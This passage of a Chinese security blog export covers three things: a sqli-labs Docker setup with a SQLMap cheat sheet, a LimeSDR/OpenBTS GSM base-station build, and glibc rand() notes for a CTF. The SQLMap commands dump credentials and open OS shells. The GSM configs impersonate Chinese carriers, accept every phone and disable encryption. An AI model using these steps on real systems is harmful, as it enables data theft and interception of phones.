sec)您可以从此输出中看到root用户将使用密码进行身份验证。您现在可以使用您在此处为其设置的密码以root用户身份登录phpMyAdmin界面。 因为sqli-lab年代久远的关系,应该只支持到PHP5的版本.现在有两种办法解决,一种是直接将PHP降级,一种是使用修改过的版本.https://github.com/Rinkish/Sqli_Edited_Versionhttp://www.hackingarticles.in/set-sqli-lab-kali/ 后来还发现一种简单的办法,就是直接使用Docker.1234567891011121314151617181920212223242526272829https://www.jianshu.com/p/2ad3edf3c61fsudo apt-get update#更新软件库sudo apt install docker-ce#安装docker-cesudo docker version#查看是否安装成功docker search sqli-labs #搜索镜像docker pull acgpiano/sqli-labs #选择了acgpiano#大写代表的是预定义可替换docker run -dt --name NAME -p PORT:80 --rm acgpiano/sqli-labs#run 创建一个新的容器并运行一个命令#-d 表示后台运行,返回容器id#-t 为容器重新分配一个伪输入终端，通常与 -i 同时使用#--name NAME 将容器命名为NAME#-p PORT:80 将acgpiano/sqli-labs的80端口映射到本地的PORT端口docker ps#查看正在运行的容器docker ps -a#查看所有容器docker exec -it ID /bin/bash#exec 在运行的容器中执行命令#-t 分配一个伪终端#-i 即使没有附加也保持STDINcd /var/www/html #进入网站放置目录mysql -u root -p #进入mysql,默认密码为空docker images #列出本地镜像docker start CONTAINER #启动一个或多少已经被停止的容器docker stop CONTAINER #停止一个运行中的容器docker restart CONTAINER #重启容器docker rm CONTAINER #删除容器docker rmi IMAGE #删除镜像sudo systemctl daemon-reload #reload daemon.jsonsudo systemctl restart docker #重启docker 使用 SQLMap入个门 判断是否存在注入python sqlmap.py -u &#39;http://10.10.10.153/sql1/Less-1/?id=8&quot; 判断文本请求是否存在注入sqlmap.py -r 1.txt 查询当前用户下的所有数据库python sqlmap.py -u &#39;http://10.10.10.153/sql1/Less-1/?id=8&quot; --dbs--dbs可以缩写为-D 获取数据库中的表名python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security --tables 获取表中的字段名python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security -T users --columns 获取字段内容python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security -T users -C username,password --dump 获取数据库的所有用户python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --users 获取数据库用户的密码python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --passwords 获取当前网站数据库名称python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --current-db 获取当前数据库的用户名称 python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --current-user --level 5 探测等级 --is-dba 当前用户是否为管理权限 --roles 列出数据库管理员角色 --referer HTTP Referer头 --sql-shell 运行自定义SQL语句 --os-cmd, --os-shell 运行任意操作系统命令 --fire-read 从数据库服务器中读取文件 --file-write --file-dest 上传文件到数据库服务器中]]></content>
  </entry>
  <entry>
    <title><![CDATA[基于LimeSDR的GSM网络搭建]]></title>
    <url>%2F2018%2F07%2F17%2F%E5%9F%BA%E4%BA%8ELimeSDR%E7%9A%84GSM%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[这篇是记录怎么搭建简易GSM基站的，过程很复杂。搞了很长时间，现在慢慢整理一下。理一下思路。 首先是看到这个http://osmocom.org/projects/osmobts/wiki/Wiki 准备因为驱动的复杂性，必须从零开始。准备一个xubuntu16.04的全新虚拟机。理论上的安装顺序是（UHD，SoapySDR,SoapyUHD,LimeSuite)但是我不是这样装的，等会儿会提到。 安装首先根据这个页面https://osmocom.org/projects/osmotrx/wiki/LimeSDR_Build_From_Source进行安装，但其中某些操作要改变，否则会出问题。 LimeSuite UHD SoapyUHD 依赖1234567891011sudo add-apt-repository -y ppa:myriadrf/driverssudo apt-get update#install core library and build dependenciessudo apt-get install git g++ cmake libsqlite3-dev #install hardware support dependenciessudo apt-get install libsoapysdr-dev libi2c-dev libusb-1.0-0-dev gnuplot#install graphics dependenciessudo apt-get install libwxgtk3.0-dev freeglut3-dev Install LimeSuite这里出现问题，不能安装最新版的LimeSuite以及硬件驱动。否则会出问题，类似于这样osmo-trx: symbol lookup error: osmo-trx: undefined symbol: _ZN3uhd3msg16register_handlerERKPFvNS0_6type_tERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE原因是新版的驱动将device name 从 STREAM 变成了 FX3 所导致的问题。解决办法是下载旧版本的LimeSuite,进行安装，更新成旧版本的驱动。我就从github找到了17.12版本，进行安装。123456789cd LimeSuitemkdir builddir &amp;&amp; cd builddircmake ../make -j4sudo make installsudo ldconfigcd LimeSuite/udev-rulessudo sh ./install.sh Install UHD12345678910111213141516171819202122sudo apt-get -y install git swig cmake doxygen build-essential libboost-all-dev libtool libusb-1.0-0 libusb-1.0-0-dev libudev-dev libncurses5-dev libfftw3-bin libfftw3-dev libfftw3-doc libcppunit-1.13-0v5 libcppunit-dev libcppunit-doc ncurses-bin cpufrequtils python-numpy python-numpy-doc python-numpy-dbg python-scipy python-docutils qt4-bin-dbg qt4-default qt4-doc libqt4-dev libqt4-dev-bin python-qt4 python-qt4-dbg python-qt4-dev python-qt4-doc python-qt4-doc libqwt6abi1 libfftw3-bin libfftw3-dev libfftw3-doc ncurses-bin libncurses5 libncurses5-dev libncurses5-dbg libfontconfig1-dev libxrender-dev libpulse-dev swig g++ automake autoconf libtool python-dev libfftw3-dev libcppunit-dev libboost-all-dev libusb-dev libusb-1.0-0-dev fort77 libsdl1.2-dev python-wxgtk3.0 git-core libqt4-dev python-numpy ccache python-opengl libgsl-dev python-cheetah python-mako python-lxml doxygen qt4-default qt4-dev-tools libusb-1.0-0-dev libqwt5-qt4-dev libqwtplot3d-qt4-dev pyqt4-dev-tools python-qwt5-qt4 cmake git-core wget libxi-dev gtk2-engines-pixbuf r-base-dev python-tk liborc-0.4-0 liborc-0.4-dev libasound2-dev python-gtk2 libzmq-dev libzmq1 python-requests python-sphinx libcomedi-dev python-zmqgit clone https://github.com/EttusResearch/uhdcd uhdgit tag -l...release_003_009_004release_003_009_005release_003_010_000_000# Example: For UHD 3.10.000.000: git checkout release_003_010_000_000 (get the latest if fine)cd hostmkdir buildcd build cmake ../makesudo make installsudo ldconfigexport LD_LIBRARY_PATH=/usr/local/lib Install SoapySDR and SoapyUHD1234567891011121314151617git clone https://github.com/pothosware/SoapySDR.gitcd SoapySDRmkdir buildcd buildcmake ..makesudo make installsudo ldconfiggit clone https://github.com/pothosware/SoapyUHDcd SoapyUHDmkdir buildcd buildcmake ..makesudo make installsudo ldconfig 到这里之后，运行uhd_find_devices是找不到设备的，是因为我们安装顺序的关系，这时候重新安装一次LimeSuite即可。主要要更新固件，方法是打开LimeSuiteGUI-Modules-Programming-Program. Install libosmocore参考：https://osmocom.org/projects/libosmocore/wiki/Libosmocore这个比较坑12sudo apt-get install build-essential libtool libtalloc-dev shtool autoconf automake git-core pkg-config make gccsudo apt-get install libpcsclite-dev 这里直接./configure可能会报错，需要安装libgnutls-dev.apt install 即可12345678git clone git://git.osmocom.org/libosmocore.gitcd libosmocore/autoreconf -i./configuremakesudo make installsudo ldconfig -icd .. Install osmo-trx1234567git clone https://github.com/osmocom/osmo-trxcd osmo-trxautoreconf -fi./configuremake -j5sudo make installsudo ldconfig 这里一定要通过源码编译安装，如果通过apt安装也会报错。错误大概如下123terminate called after throwing an instance of &apos;std::bad_alloc&apos; what(): std::bad_allocAborted (core dumped) Install osmo-nitb参考：https://osmocom.org/projects/cellular-infrastructure/wiki/Nightly_Builds12345678910wget --https-only https://download.opensuse.org/repositories/network:/osmocom:/nightly/xUbuntu_16.04/Release.keysha256sum Release.key# verify the SHA256 sum with the one on https://osmocom.org/projects/cellular-infrastructure/wiki/Nightly_Buildssudo apt-key add Release.keysudo suecho &quot;deb http://download.opensuse.org/repositories/network:/osmocom:/nightly/xUbuntu_16.04/ ./&quot; &gt; /etc/apt/sources.list.d/osmocom-nightly.listexitsudo apt-get updatesudo apt-get install osmocom-nitb osmo-bts-trx OpenBTS安装到这里之后其实有两种选择，一种是OpenBTS,一种是OpenBSC。OsmoTRX和OpenBTS是兼容的，可以实现语音和SMS服务，但是GPRS是不支持的。理论上OsmoTRX支持osmoPCU和osmoBTS的GPRS功能。 安装OpenBTS1234567mkdir OpenBTS //新建OpenBTS文件夹cd OpenBTS //进入该文件夹git clone https://github.com/RangeNetworks/dev.gitcd dev./clone.sh //克隆代码./switchto.sh master //切到master分支./build.sh B200 //构建USRP B200设备支持 123sudo apt-get install software-properties-common python-software-propertiessudo add-apt-repository ppa:chris-lea/zeromqsudo apt-get update 进入 OpenBTS/dev/BUILDS/日期&#39;文件夹把所有deb都通过sudo dpkg -i安装 有问题就用sudo apt-get install -f` 启动启动osmo-trx,这里有一个问题，我的2.4G无线鼠标会跟USB3.0有干扰，导致会出现一些问题。sudo osmo-trx-uhd -s 4 -c 1 -e -l INFO -f 加载数据库 12345678cd dev/openbts/appssudo sqlite3 -init OpenBTS.example.sql /etc/OpenBTS/OpenBTS.db &quot;.quit&quot;cd dev/subscriberRegistry/appssudo sqlite3 -init sipauthserve.example.sql /etc/OpenBTS/sipauthserve.db &quot;.quit&quot;cd dev/smqueue/smqueuesudo sqlite3 -init smqueue.example.sql /etc/OpenBTS/smqueue.db &quot;.quit&quot; 配置asterisk 1234567891011121314151617181920212223242526在/etc/asterisk/目录中需要修改sip.conf、extensions.conf 具体方法：将手机的IMSI国际用户识别码和分配的号码登记数据asterisk中，也就是将数据写入sip.conf、extensions.conf两个配置文件。SIP.CONF:[IMSI46001658*****19]callerid=2000003canreinvite=notype=friendallow=gsmcontext=sip-externalhost=dynamicdtmfmode=info[IMSI41004030*****62]callerid=2000004canreinvite=notype=friendallow=gsmcontext=sip-externalhost=dynamicdtmfmode=infocallerid=2000003,表示将IMSI为46001658*****19的手机分配号码2000003；canreinvite=no，表示被呼叫的手机一旦建立连接后OpenBTS将不再发送重新邀请的指令；context=sip-external，表示允许外部未分配号码的匿名电话呼入。 启动基站 12cd dev/openbts/apps/sudo ./OpenBTS 启动短信服务 12cd dev/smqueue/smqueuesudo ./smqueue 启用鉴权服务 12cd dev/subscriberRegistry/appssudo ./sipauthserve asterisk 12sudo asterisk -vvvcsudo asterisk -r 允许任意机器接入 12OpenBTS&gt; config Control.LUR.OpenRegistration .*Control.LUR.OpenRegistration changed from &quot;&quot; to &quot;.*&quot; 设置天线功率 123OpenBTS&gt; devconfig GSM.Radio.RxGain 18GSM.Radio.RxGain changed from &quot;50&quot; to &quot;18&quot;GSM.Radio.RxGain is static; change takes effect on restart 设置基站频段 123OpenBTS&gt; config GSM.Radio.Band 900GSM.Radio.Band changed from &quot;850&quot; to &quot;900&quot;GSM.Radio.Band is static; change takes effect on restart 设置欢迎短信 1config Control.LUR.NormalRegistration.Message Welcome to BTS 1 其他 12345678910111213141516171819202122232425设置基站名：config GSM.Identity.ShortName GroundControl将基站设置为测试网络：config Identity config GSM.Identity.MCC 001将基站设置为国内： MCC460 为中国config GSM.Identity.MCC 460设置运营商为联 * 通：config GSM.Identity.MNC 01 设置运营商为移 * 动：config GSM.Identity.MNC 00 设置ARFCN、LAC、BCC网络色码，NCC，一般用于标识运营商；基站色码，BCC，区分同一运营商下的相同BCCH的不同基站。一般采用BCCH频点和BSIC来联合标识小区，BSIC=NCC+BCC。在TD和WCDMA里，存在PLMN，PLMN=MCC+MNC，其中MCC为移动国家码，MNC为移动网络码标识运营商。基站切换的时候,主要是通过CI、BCCHBSIC等信息寻找目标小区,当同时检测到邻区列表里出现同BCCH同扰码组的小区时,容易出现切换失败。OpenBTS&gt; config GSM.Radio.C0 168GSM.Radio.C0 changed from &quot;151&quot; to &quot;168&quot;GSM.Radio.C0 is static; change takes effect on restartOpenBTS&gt; config GSM.Identity.BSIC.BCC 3GSM.Identity.BSIC.BCC changed from &quot;2&quot; to &quot;3&quot;OpenBTS&gt; config GSM.Identity.LAC 1001GSM.Identity.LAC changed from &quot;1000&quot; to &quot;1001&quot;OpenBTS&gt; config GSM.Identity.CI 11GSM.Identity.CI changed from &quot;10&quot; to &quot;11&quot; 查看已加入基站的设备OpenBTS&gt; tmsis 发送短信sendsms IMSI 号码 内容 OpenBSC然后看选择OpenBSC的折腾过程，首先可以先搞定通话和短信服务。osmonitb在之前装好了，那么可以通过123sudo osmo-trx-uhd -e # root needed for thread options set by the processosmo-nitb -c ./openbsc.cfg # change the path to your openbsc.cfg fileosmo-bts-trx -c ./osmo-bts.cfg 跑起来 需要改配置文件，我现在把成功的配置文件记录一下。osmo-trx.cfg1234567891011121314151617181920log stderr logging filter all 1 logging color 1 logging print category 1 logging timestamp 1 logging level all info!line vty no login!trx bind-ip 127.0.0.1 remote-ip 127.0.0.1 base-port 5700 egprs disable tx-sps 4 rx-sps 4 chan 0 tx-path BAND1 rx-path LNAW openbsc.cfg12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273!! OpenBSC configuration saved from vty! !password foo!line vty no login!e1_input e1_line 0 driver ipanetwork network country code 460 mobile network code 10 short name OpenBSC long name OpenBSC auth policy accept-all location updating reject cause 13 encryption a5 0 neci 1 rrlp mode none mm info 1 handover 0 handover window rxlev averaging 10 handover window rxqual averaging 1 handover window rxlev neighbor averaging 10 handover power budget interval 6 handover power budget hysteresis 3 handover maximum distance 9999 bts 0 type sysmobts band GSM900 cell_identity 0 location_area_code 1 training_sequence_code 7 base_station_id_code 63 ms max power 15 cell reselection hysteresis 4 rxlev access min 0 channel allocator ascending rach tx integer 9 rach max transmission 7 ip.access unit_id 1801 0 oml ip.access stream_id 255 line 0 gprs mode gprs gprs routing area 0 gprs cell bvci 2 gprs nsei 101 gprs nsvc 0 nsvci 101 gprs nsvc 0 local udp port 23000 gprs nsvc 0 remote udp port 23000 gprs nsvc 0 remote ip 10.10.10.150 trx 0 rf_locked 0 arfcn 975 nominal power 23 max_power_red 20 rsl e1 tei 0 timeslot 0 phys_chan_config CCCH+SDCCH4 timeslot 1 phys_chan_config SDCCH8 timeslot 2 phys_chan_config TCH/F timeslot 3 phys_chan_config TCH/F timeslot 4 phys_chan_config TCH/F timeslot 5 phys_chan_config TCH/F timeslot 6 phys_chan_config TCH/F timeslot 7 phys_chan_config TCH/F osmo-bts.cfg1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859!! OsmoBTS configuration saved from vty!!!log stderr logging filter all 1 logging color 1 logging print category 0 logging timestamp 0 logging level rsl notice logging level rll notice logging level rr notice logging level meas error logging level pag error logging level l1c error logging level l1p error logging level dsp error logging level pcu notice logging level ho notice logging level trx notice logging level loop notice logging level abis error logging level rtp notice logging level lglobal notice logging level llapd notice logging level lsms notice logging level lctrl notice logging level lstats notice!line vty no login!e1_input e1_line 0 driver ipa e1_line 0 port 0 no e1_line 0 keepalivephy 0 osmotrx ip 127.0.0.1 osmotrx fn-advance 20 osmotrx rts-advance 5 instance 0bts 0 band GSM900 ipa unit-id 1801 0 oml remote-ip 127.0.0.1 rtp jitter-buffer 100 paging queue-size 200 paging lifetime 0 uplink-power-target -75 gsmtap-sapi ccch gsmtap-sapi pdtch min-qual-rach 50 min-qual-norm -5 trx 0 power-ramp max-initial 23000 mdBm power-ramp step-size 2000 mdB power-ramp step-interval 1 ms-power-control dsp phy 0 instance 0 OpenBSC GPRS参考：https://osmocom.org/projects/cellular-infrastructure/wiki/OpenBSC_GPRShttps://github.com/cswiger/osmocom_cfg1 安装依赖apt install libdbi0-dev libdbd-sqlite3 libtool autoconf git-core pkg-config make libortp-dev 需要安装openggsnlibosmocorelibosmo-abislibosmo-netifopenbscosmo-pcu completely build osmo-bsc, osmo-msc, osmo-sgsn and osmo-ggsn123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109cd $osmo_srcgit clone git://git.osmocom.org/libosmocorecd libosmocoreautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/libosmo-abiscd libosmo-abisautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/libosmo-netifcd libosmo-netifautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/libosmo-sccpcd libosmo-sccpautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/libsmpp34cd libsmpp34autoreconf -fi./configuremakemake checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/osmo-mgwcd osmo-mgwautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/libasn1ccd libasn1cautoreconf -fi./configuremakemake checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/osmo-iuhcd osmo-iuhautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/osmo-msccd osmo-mscautoreconf -fi./configure --enable-iumake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/osmo-ggsncd osmo-ggsnautoreconf -fi./configuremake -j5make checkmake installsudo ldconfigcd $osmo_srcgit clone git://git.osmocom.org/osmo-sgsncd osmo-sgsnautoreconf -fi./configure --enable-iumake -j5make checkmake installsudo ldconfig 配置文件openbsc.cfg123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158!! OpenBSC (1.0.0.14-98a2ba) configuration saved from vty!!password foo!log stderr logging filter all 1 logging color 1 logging print category 0 logging timestamp 0 logging print file 1 logging level all everything logging level rll notice logging level cc notice logging level mm notice logging level rr notice logging level rsl notice logging level nm info logging level mncc notice logging level pag notice logging level meas notice logging level sccp notice logging level msc notice logging level mgcp notice logging level ho notice logging level db notice logging level ref notice logging level gprs debug logging level ns info logging level bssgp debug logging level llc debug logging level sndcp debug logging level nat notice logging level ctrl notice logging level smpp debug logging level filter debug logging level ranap debug logging level sua debug logging level pcu debug logging level lglobal notice logging level llapd notice logging level linp notice logging level lmux notice logging level lmi notice logging level lmib notice logging level lsms notice logging level lctrl notice logging level lgtp notice logging level lstats notice logging level lgsup notice logging level loap notice logging level lss7 notice logging level lsccp notice logging level lsua notice logging level lm3ua notice logging level lmgcp notice!stats interval 5!line vty no login!e1_input e1_line 0 driver ipa e1_line 0 port 0 no e1_line 0 keepalivenetwork network country code 460 mobile network code 10 short name OpenBSC long name OpenBSC auth policy accept-all authorized-regexp .* location updating reject cause 13 encryption a5 0 neci 1 paging any use tch 0 rrlp mode none mm info 1 handover 0 handover window rxlev averaging 10 handover window rxqual averaging 1 handover window rxlev neighbor averaging 10 handover power budget interval 6 handover power budget hysteresis 3 handover maximum distance 9999 dyn_ts_allow_tch_f 0 subscriber-keep-in-ram 0 bts 0 type sysmobts band GSM900 cell_identity 0 location_area_code 1 base_station_id_code 63 ms max power 35 cell reselection hysteresis 4 rxlev access min 0 periodic location update 30 radio-link-timeout 32 channel allocator ascending rach tx integer 9 rach max transmission 7 channel-descrption attach 1 channel-descrption bs-pa-mfrms 5 channel-descrption bs-ag-blks-res 1 early-classmark-sending forbidden early-classmark-sending-3g allowed ip.access unit_id 1801 0 oml ip.access stream_id 255 line 0 neighbor-list mode automatic codec-support fr efr amr amr tch-f modes 2 amr tch-f start-mode 1 gprs mode gprs gprs routing area 1 gprs cell bvci 1234 gprs nsei 1234 gprs nsvc 0 nsvci 1234 gprs nsvc 0 local udp port 23001 gprs nsvc 0 remote udp port 23000 gprs nsvc 0 remote ip 127.0.0.1 no force-combined-si trx 0 rf_locked 0 arfcn 975 nominal power 13 max_power_red 0 rsl e1 tei 0 timeslot 0 phys_chan_config CCCH+SDCCH4 hopping enabled 0 timeslot 1 phys_chan_config SDCCH8 hopping enabled 0 timeslot 2 phys_chan_config TCH/F hopping enabled 0 timeslot 3 phys_chan_config TCH/F hopping enabled 0 timeslot 4 phys_chan_config PDCH hopping enabled 0 timeslot 5 phys_chan_config PDCH hopping enabled 0 timeslot 6 phys_chan_config PDCH hopping enabled 0 timeslot 7 phys_chan_config PDCH hopping enabled 0mncc-int default-codec tch-f fr default-codec tch-h hrnitb subscriber-create-on-demand assign-tmsi osmo-bts.cfg12345678910111213141516171819202122232425262728293031323334!! OsmoBTS () configuration saved from vty!!!log stderr logging color 1 logging timestamp 0 logging level rsl notice logging level oml notice logging level rll notice logging level rr notice logging level meas error logging level pag error logging level l1c error logging level l1p error logging level dsp error logging level abis error!line vty no login!phy 0 instance 0 osmotrx rx-gain 43 osmotrx ip local 127.0.0.1 osmotrx ip remote 127.0.0.1bts 0 band 900 ipa unit-id 1801 0 oml remote-ip 127.0.0.1 gsmtap-sapi ccch gsmtap-sapi pdtch trx 0 phy 0 instance 0 osmo-ggsn.cfg123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475!! OpenGGSN (0.94.1-adac) configuration saved from vty!!!log stderr logging filter all 1 logging color 1 logging print category 0 logging timestamp 0 logging level ip info logging level tun info logging level ggsn info logging level sgsn notice logging level icmp6 notice logging level lglobal notice logging level llapd notice logging level linp notice logging level lmux notice logging level lmi notice logging level lmib notice logging level lsms notice logging level lctrl notice logging level lgtp info logging level lstats notice logging level lgsup notice logging level loap notice logging level lss7 notice logging level lsccp notice logging level lsua notice logging level lm3ua notice logging level lmgcp notice!stats interval 5!line vty no login!ggsn ggsn0 gtp state-dir /tmp gtp bind-ip 127.0.0.6 apn internet gtpu-mode tun tun-device tun4 type-support v4 ip prefix dynamic 176.16.222.0/24! ip prefix dynamic 192.168.7.0/24 ip dns 0 114.114.114.114 ip dns 1 8.8.8.8 ip ifconfig 176.16.222.0/24! ip ifconfig 192.168.7.0/24 no shutdown apn inet6 gtpu-mode tun tun-device tun6 type-support v6 ipv6 prefix dynamic 2001:780:44:2000:0:0:0:0/56 ipv6 dns 0 2001:4860:4860::8888 ipv6 dns 1 2001:4860:4860::8844 ipv6 ifconfig 2001:780:44:2000:0:0:0:0/56 no shutdown apn inet46 gtpu-mode tun tun-device tun46 type-support v4v6 ip prefix dynamic 176.16.46.0/24 ip dns 0 114.114.114.114 ip dns 1 8.8.8.8 ip ifconfig 176.16.46.0/24 ipv6 prefix dynamic 2001:780:44:2100:0:0:0:0/56 ipv6 dns 0 2001:4860:4860::8888 ipv6 dns 1 2001:4860:4860::8844 ipv6 ifconfig 2001:780:44:2100:0:0:0:0/56 no shutdown default-apn internet no shutdown ggsn osmo-pcu.cfg12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364!! Osmo-PCU (0.4.0.83-5b22) configuration saved from vty!!!log stderr logging filter all 1 logging color 1 logging print category 0 logging timestamp 0 logging print file 1 logging level all everything logging level csn1 info logging level l1if info logging level rlcmac notice logging level rlcmacdata notice logging level rlcmacdl notice logging level rlcmacul notice logging level rlcmacsched notice logging level rlcmacmeas info logging level tbf info logging level tbfdl info logging level tbful info logging level ns info logging level bssgp info logging level pcu notice logging level lglobal notice logging level llapd notice logging level linp notice logging level lmux notice logging level lmi notice logging level lmib notice logging level lsms notice logging level lctrl notice logging level lgtp notice logging level lstats notice logging level lgsup notice logging level loap notice logging level lss7 notice logging level lsccp notice logging level lsua notice logging level lm3ua notice logging level lmgcp notice!stats interval 5!line vty no login!pcu flow-control-interval 10 cs 2 cs max 4 cs threshold 10 33 cs downgrade-threshold 200 cs link-quality-ranges cs1 6 cs2 5 8 cs3 7 13 cs4 12 mcs link-quality-ranges mcs1 6 mcs2 5 8 mcs3 7 13 mcs4 12 15 mcs5 14 17 mcs6 16 18 mcs7 17 20 mcs8 19 24 mcs9 23 mcs max 9 window-size 64 0 queue idle-ack-delay 10 queue codel alloc-algorithm dynamic alpha 0 gamma 0 dl-tbf-idle-time 2000 osmo-sgsn.cfg12345678910111213141516171819202122232425262728293031!! Osmocom SGSN configuration!!line vty no login!sgsn gtp local-ip 127.0.0.1 ggsn 0 remote-ip 127.0.0.6 ggsn 0 gtp-version 1! auth-policy closed! accept-all, closed, acl-only, remote auth-policy accept-all! gsup remote-ip 127.0.0.1! gsup remote-port 4222!ns timer tns-block 3 timer tns-block-retries 3 timer tns-reset 3 timer tns-reset-retries 3 timer tns-test 30 timer tns-alive 3 timer tns-alive-retries 10 encapsulation udp local-ip 127.0.0.1 encapsulation udp local-port 23000 encapsulation framerelay-gre enabled 0!bssgp! osmo-trx.cfg1234567891011121314151617181920log stderr logging filter all 1 logging color 1 logging print category 1 logging timestamp 1 logging level all info!line vty no login!trx bind-ip 127.0.0.1 remote-ip 127.0.0.1 base-port 5700 egprs disable tx-sps 4 rx-sps 4 chan 0 tx-path BAND1 rx-path LNAW 运行1234567sudo ufw disablesudo iptables -Fsudo iptables -t nat -Fiptables -A POSTROUTING -t nat -o ens33 -j MASQUERADE &lt;-- change to your nic interfacesudo -secho 1 &gt; /proc/sys/net/ipv4/ip_forwardexit 开多个终端跑起来123456sudo osmo-trx -b4 -s4sudo osmo-nitb -m -Psudo osmo-pcusudo osmo-sgsnsudo osmo-ggsnsudo osmo-bts-trx]]></content>
  </entry>
  <entry>
    <title><![CDATA[探究rand()函数生成的伪随机数]]></title>
    <url>%2F2018%2F07%2F12%2F%E6%8E%A2%E7%A9%B6rand%2F</url>
    <content type="text"><![CDATA[今天碰到了一个关于rand()伪随机数的问题，很有意思，记录一下。 伪随机性摘自Wikipedia:伪随机性（英语：Pseudorandomness）是一个过程似乎是随机的，但实际上并不是。例如伪随机数是使用一个确定性的算法计算出来的似乎是随机的数序，因此伪随机数实际上并不随机。在计算伪随机数时假如使用的开始值不变的话，那么伪随机数的数序也不变。伪随机数的随机性可以用它的统计特性来衡量，其主要特征是每个数出现的可能性和它出现时与数序中其它数的关系。伪随机数的优点是它的计算比较简单，而且只使用少数数值很难推算出计算它的算法。一般人们使用一个假的随机数，比如电脑上的时间作为计算伪随机数的开始值。 rand()函数我想知道rand()的实现方式，尝试调试了一下，比较复杂。找到了glibc的源码，地址：http://ftp.gnu.org/gnu/glibc/123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int__random_r (struct random_data *buf, int32_t *result)&#123; int32_t *state; if (buf == NULL || result == NULL) goto fail; state = buf-&gt;state; if (buf-&gt;rand_type == TYPE_0) &#123; int32_t val = state[0]; val = ((state[0] * 1103515245) + 12345) &amp; 0x7fffffff; state[0] = val; *result = val; &#125; else &#123; int32_t *fptr = buf-&gt;fptr; int32_t *rptr = buf-&gt;rptr; int32_t *end_ptr = buf-&gt;end_ptr; int32_t val; val = *fptr += *rptr; /* Chucking least random bit. */ *result = (val &gt;&gt; 1) &amp; 0x7fffffff; ++fptr; if (fptr &gt;= end_ptr) &#123; fptr = state; ++rptr; &#125; else &#123; ++rptr; if (rptr &gt;= end_ptr) rptr = state; &#125; buf-&gt;fptr = fptr; buf-&gt;rptr = rptr; &#125; return 0; fail: __set_errno (EINVAL); return -1;&#125; 可以看到glibc的实现其中有两种算法，一种是线性同余法LCG（linear congruential generator),一种是additive feedback generator.使用哪个生成器取决于initstate()函数生成的初始状态。 initstate()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int__initstate_r (unsigned int seed, char *arg_state, size_t n, struct random_data *buf)&#123; if (buf == NULL) goto fail; int32_t *old_state = buf-&gt;state; if (old_state != NULL) &#123; int old_type = buf-&gt;rand_type; if (old_type == TYPE_0) old_state[-1] = TYPE_0; else old_state[-1] = (MAX_TYPES * (buf-&gt;rptr - old_state)) + old_type; &#125; int type; if (n &gt;= BREAK_3) type = n &lt; BREAK_4 ? TYPE_3 : TYPE_4; else if (n &lt; BREAK_1) &#123; if (n &lt; BREAK_0) goto fail; type = TYPE_0; &#125; else type = n &lt; BREAK_2 ? TYPE_1 : TYPE_2; int degree = random_poly_info.degrees[type]; int separation = random_poly_info.seps[type]; buf-&gt;rand_type = type; buf-&gt;rand_sep = separation; buf-&gt;rand_deg = degree; int32_t *state = &amp;((int32_t *) arg_state)[1]; /* First location. */ /* Must set END_PTR before srandom. */ buf-&gt;end_ptr = &amp;state[degree]; buf-&gt;state = state; __srandom_r (seed, buf); state[-1] = TYPE_0; if (type != TYPE_0) state[-1] = (buf-&gt;rptr - state) * MAX_TYPES + type; return 0; fail: __set_errno (EINVAL); return -1;&#125; LCG生成器只在state size为8个字节的时候使用，当更大时就使用第二种生成器。使用srand()设置种子的时候，默认状态的大小为128字节。 LCGWiki:https://en.wikipedia.org/wiki/Linear_congruential_generator线性同余方法是最知名的伪随机数生成器算法之一，容易理解，易于实现，速度快。但是有一个缺点，当你获得一个伪随机数以后。当前周期不会再获取到这一个数，恰好2……31次调用之后获得这个数，而且只会得到这个数。LAFG生成器就没有这个问题，可以在同一个周期获得多次同一个数。 实际问题今天碰到的一个MISC题通过IDA分析后情况如下：12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax@4 __int64 v4; // rcx@4 unsigned int num; // [sp+8h] [bp-38h]@1 unsigned int N; // [sp+Ch] [bp-34h]@1 time_t seed; // [sp+10h] [bp-30h]@1 tm *time_info; // [sp+18h] [bp-28h]@1 char buf[9]; // [sp+20h] [bp-20h]@1 __int64 v10; // [sp+38h] [bp-8h]@1 v10 = *MK_FP(__FS__, 40LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); seed = time(0LL); srand(seed); N = rand() &gt;&gt; 8; 